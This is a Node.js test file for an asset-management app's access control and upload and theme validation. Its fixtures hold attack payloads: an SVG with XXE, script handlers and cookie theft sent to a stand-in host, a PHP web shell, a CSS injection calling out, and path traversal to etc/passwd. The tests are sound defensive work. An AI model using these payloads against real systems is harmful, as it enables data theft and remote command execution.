'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const zlib = require('node:zlib');
const { harness, client, loginAs, seedMasters, ADMIN } = require('./helpers');

/* ---- fixtures: real files, not stubs ---- */
let TBL = null;
function crc32(buf) {
  if (!TBL) { TBL = new Int32Array(256);
    for (let n = 0; n < 256; n++) { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; TBL[n] = c; } }
  let c = 0xffffffff;
  for (let i = 0; i < buf.length; i++) c = TBL[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}
function makePng(r = 30, g = 90, b = 120) {
  const chunk = (type, data) => {
    const len = Buffer.alloc(4); len.writeUInt32BE(data.length);
    const body = Buffer.concat([Buffer.from(type, 'latin1'), data]);
    const crc = Buffer.alloc(4); crc.writeUInt32BE(crc32(body));
    return Buffer.concat([len, body, crc]);
  };
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(1, 0); ihdr.writeUInt32BE(1, 4); ihdr[8] = 8; ihdr[9] = 2;
  return Buffer.concat([
    Buffer.from([0x89,0x50,0x4e,0x47,0x0d,0x0a,0x1a,0x0a]),
    chunk('IHDR', ihdr), chunk('IDAT', zlib.deflateSync(Buffer.from([0, r, g, b]))),
    chunk('IEND', Buffer.alloc(0))]);
}
const b64 = buf => buf.toString('base64');
const SVG_EVIL = Buffer.from('<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' +
  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" onload="alert(document.cookie)">' +
  '<script>fetch("//evil.test/"+document.cookie)<\/script>' +
  '<a href="javascript:alert(1)"><rect width="10" height="10" fill="#123456"/></a>' +
  '<foreignObject><img src=x onerror=alert(2)></foreignObject></svg>');

async function asAdmin() {
  const { app, db } = await harness();
  const c = client(app);
  await loginAs(c, ADMIN.email, ADMIN.password);
  await seedMasters(c);
  return { app, db, c };
}
async function asRole(app, c, role, email) {
  await c.post('/api/users', { name: role + ' User', email, role, password: 'a-fine-password-1' });
  const s = client(app);
  await loginAs(s, email, 'a-fine-password-1');
  return s;
}

/* ---- roles are enforced on the server ---- */

test('a Viewer can read but cannot change anything', async () => {
  const { app, c } = await asAdmin();
  const v = await asRole(app, c, 'Viewer', 'viewer@example.com');
  assert.equal((await v.get('/api/bootstrap')).status, 200, 'reading is allowed');
  assert.equal((await v.post('/api/assets', { user: 'X', siteCode: 'HO' })).status, 403);
  assert.equal((await v.post('/api/assets/bulk', { ids: ['a'], patch: { status: 'Spare' } })).status, 403);
  assert.equal((await v.post('/api/departments', { name: 'Z' })).status, 403);
  assert.equal((await v.put('/api/settings/theme', { fontSize: 20 })).status, 403);
  assert.equal((await v.post('/api/settings/logo', { data: b64(makePng()) })).status, 403);
  assert.equal((await v.post('/api/users', { name: 'N', email: 'n@e.com', role: 'Admin', password: 'x'.repeat(12) })).status, 403);
  await v.close(); await c.close();
});

test('a Manager can edit assets but not masters, users or the theme', async () => {
  const { app, c } = await asAdmin();
  const m = await asRole(app, c, 'Manager', 'manager@example.com');
  assert.equal((await m.post('/api/assets', { user: 'X', siteCode: 'HO', dept: 'IT' })).status, 201);
  assert.equal((await m.post('/api/departments', { name: 'New' })).status, 403);
  assert.equal((await m.post('/api/users', { name: 'N', email: 'n@e.com', role: 'Viewer', password: 'x'.repeat(12) })).status, 403);
  assert.equal((await m.put('/api/settings/theme', { fontSize: 20 })).status, 403);
  await m.close(); await c.close();
});

test('a Manager cannot delete assets; an Admin can', async () => {
  const { app, c } = await asAdmin();
  const a = (await c.post('/api/assets', { user: 'X', siteCode: 'HO', dept: 'IT' })).body.asset;
  const m = await asRole(app, c, 'Manager', 'm2@example.com');
  assert.equal((await m.del(`/api/assets/${a.id}`, {})).status, 403);
  assert.equal((await c.del(`/api/assets/${a.id}`, {})).status, 200);
  await m.close(); await c.close();
});

test('site scoping hides other sites and blocks writing to them', async () => {
  const { app, db, c } = await asAdmin();
  await c.post('/api/assets', { user: 'At HO', siteCode: 'HO', dept: 'IT' });
  const dwc = (await c.post('/api/assets', { user: 'At DWC', siteCode: 'DWC', dept: 'IT' })).body.asset;
  await c.post('/api/users', { name: 'Scoped', email: 'scoped@example.com', role: 'Manager',
    password: 'a-fine-password-1', sites: ['HO'] });
  const s = client(app);
  await loginAs(s, 'scoped@example.com', 'a-fine-password-1');

  const boot = (await s.get('/api/bootstrap')).body;
  assert.equal(boot.assets.length, 1, 'only the permitted site is visible');
  assert.equal(boot.assets[0].user, 'At HO');
  assert.equal((await s.post('/api/assets', { user: 'Sneak', siteCode: 'DWC', dept: 'IT' })).status, 403);
  assert.equal((await s.put(`/api/assets/${dwc.id}`, { version: dwc.version, vendor: 'X' })).status, 403);
  const bulk = await s.post('/api/assets/bulk', { ids: [dwc.id], patch: { status: 'Spare' } });
  assert.equal(bulk.body.changed, 0, 'bulk silently skips assets outside the scope');
  await s.close(); await c.close();
});

test('the last administrator cannot be demoted, deactivated or deleted', async () => {
  const { db, c } = await asAdmin();
  const me = await db.get('SELECT id FROM users WHERE role = ?', ['Admin']);
  assert.equal((await c.put(`/api/users/${me.id}`, { role: 'Viewer' })).body.error.code, 'LAST_ADMIN');
  assert.equal((await c.put(`/api/users/${me.id}`, { active: false })).body.error.code, 'LAST_ADMIN');
  assert.equal((await c.del(`/api/users/${me.id}`, {})).body.error.code, 'SELF');
  await c.close();
});

/* ---- upload validation now runs on the server ---- */

test('a valid PNG is stored and served with hardened headers', async () => {
  const { app, c } = await asAdmin();
  const r = await c.post('/api/settings/logo', { data: b64(makePng()) });
  assert.equal(r.status, 201);
  assert.match(r.body.logo.filename, /^logo-[0-9a-f]{32}\.png$/);
  const served = await c.get(r.body.logo.url);
  assert.equal(served.status, 200);
  assert.equal(served.headers.get('x-content-type-options'), 'nosniff');
  assert.match(served.headers.get('content-security-policy'), /sandbox/);
  await c.close();
});

test('a PHP payload declared as a PNG is rejected by the SERVER', async () => {
  const { db, c } = await asAdmin();
  const evil = Buffer.from('<?php system($_GET["c"]); ?>' + 'A'.repeat(60));
  const r = await c.post('/api/settings/logo', { data: b64(evil) });
  assert.equal(r.status, 415);
  assert.equal(r.body.error.code, 'UNSUPPORTED_TYPE');
  const n = await db.get('SELECT count(*) AS c FROM files');
  assert.equal(Number(n.c), 0, 'nothing was stored');
  await c.close();
});

test('a malicious SVG sent straight to the API is sanitised server-side', async () => {
  const { db, c } = await asAdmin();
  const r = await c.post('/api/settings/logo', { data: b64(SVG_EVIL) });
  assert.equal(r.status, 201, 'accepted after cleaning');
  assert.ok(r.body.sanitizedBytes > 0, 'bytes were removed');
  const row = await db.get('SELECT * FROM files WHERE name = ?', [r.body.logo.filename]);
  const stored = Buffer.from(row.content).toString('utf8');
  for (const bad of [/<script/i, /onload/i, /onerror/i, /javascript:/i, /foreignObject/i, /<!ENTITY/i]) {
    assert.ok(!bad.test(stored), `${bad} survived sanitisation`);
  }
  assert.match(stored, /<rect/i, 'legitimate markup kept');
  const served = await c.get(r.body.logo.url);
  assert.ok(!/<script/i.test(served.text), 'and the served bytes are clean too');
  await c.close();
});

test('a truncated PNG is refused as corrupt', async () => {
  const { c } = await asAdmin();
  const r = await c.post('/api/settings/logo', { data: b64(makePng().subarray(0, 28)) });
  assert.equal(r.status, 422);
  assert.equal(r.body.error.code, 'CORRUPT_FILE');
  await c.close();
});

test('an oversize image is refused', async () => {
  const { c } = await asAdmin();
  const big = Buffer.concat([makePng(), Buffer.alloc(2 * 1024 * 1024 + 64)]);
  const r = await c.post('/api/settings/logo', { data: b64(big) });
  assert.equal(r.status, 413);
  await c.close();
});

test('a malformed base64 payload is refused, not thrown on', async () => {
  const { c } = await asAdmin();
  for (const data of ['!!!not base64!!!', '', null, 12345, {}]) {
    const r = await c.post('/api/settings/logo', { data });
    assert.ok(r.status === 400 || r.status === 422, `${JSON.stringify(data)} -> ${r.status}`);
  }
  await c.close();
});

test('re-uploading the same image dedupes and keeps the file in use', async () => {
  const { db, c } = await asAdmin();
  const a = await c.post('/api/settings/logo', { data: b64(makePng()) });
  const b = await c.post('/api/settings/logo', { data: b64(makePng()) });
  assert.equal(a.body.logo.filename, b.body.logo.filename);
  assert.equal(b.body.deduplicated, true);
  const n = await db.get('SELECT count(*) AS c FROM files');
  assert.equal(Number(n.c), 1);
  assert.equal((await c.get(b.body.logo.url)).status, 200, 'still served');
  await c.close();
});

test('replacing a logo deletes the superseded file', async () => {
  const { db, c } = await asAdmin();
  const first = await c.post('/api/settings/logo', { data: b64(makePng(1, 2, 3)) });
  const second = await c.post('/api/settings/logo', { data: b64(makePng(9, 9, 9)) });
  assert.equal(second.body.replaced, true);
  assert.equal((await c.get(first.body.logo.url)).status, 404, 'old file gone');
  const n = await db.get('SELECT count(*) AS c FROM files');
  assert.equal(Number(n.c), 1);
  await c.close();
});

test('the uploads route refuses a traversal-shaped name', async () => {
  const { c } = await asAdmin();
  for (const name of ['..%2F..%2Fetc%2Fpasswd', 'a%2Fb']) {
    const r = await c.get('/uploads/' + name);
    assert.ok(r.status === 400 || r.status === 404, `${name} -> ${r.status}`);
  }
  await c.close();
});

/* ---- theme validation ---- */

test('CSS injection through font-family is refused', async () => {
  const { c } = await asAdmin();
  const r = await c.put('/api/settings/theme', { fontFamily: 'system; background:url(//evil.test/steal)' });
  assert.equal(r.status, 422);
  assert.ok(r.body.error.fields.fontFamily);
  await c.close();
});

test('theme values are range-checked and normalised', async () => {
  const { c } = await asAdmin();
  assert.equal((await c.put('/api/settings/theme', { fontSize: 99 })).status, 422);
  assert.equal((await c.put('/api/settings/theme', { primaryColor: 'blue' })).status, 422);
  const ok = await c.put('/api/settings/theme', { primaryColor: '#ABC', fontSize: 18 });
  assert.equal(ok.body.theme.primaryColor, '#aabbcc');
  const partial = await c.put('/api/settings/theme', { textColor: '#111111' });
  assert.equal(partial.body.theme.fontSize, 18, 'omitted fields keep their stored value');
  await c.close();
});

test('reset refuses to guess about the logo', async () => {
  const { c } = await asAdmin();
  await c.post('/api/settings/logo', { data: b64(makePng()) });
  assert.equal((await c.post('/api/settings/theme/reset', {})).status, 400);
  const keep = await c.post('/api/settings/theme/reset', { logoAction: 'keep' });
  assert.equal(keep.body.logoDeleted, false);
  assert.ok(keep.body.logo);
  const del = await c.post('/api/settings/theme/reset', { logoAction: 'delete' });
  assert.equal(del.body.logoDeleted, true);
  assert.equal(del.body.logo, null);
  await c.close();
});

test('no endpoint ever returns password material', async () => {
  const { c } = await asAdmin();
  const boot = await c.get('/api/bootstrap');
  const text = JSON.stringify(boot.body);
  assert.ok(!/pw_hash|pw_salt/.test(text), 'bootstrap leaked a hash');
  const created = await c.post('/api/users', { name: 'P', email: 'p@example.com', role: 'Viewer', password: 'a-fine-password-1' });
  assert.ok(!/pw_hash|pw_salt/.test(JSON.stringify(created.body)));
  await c.close();
});
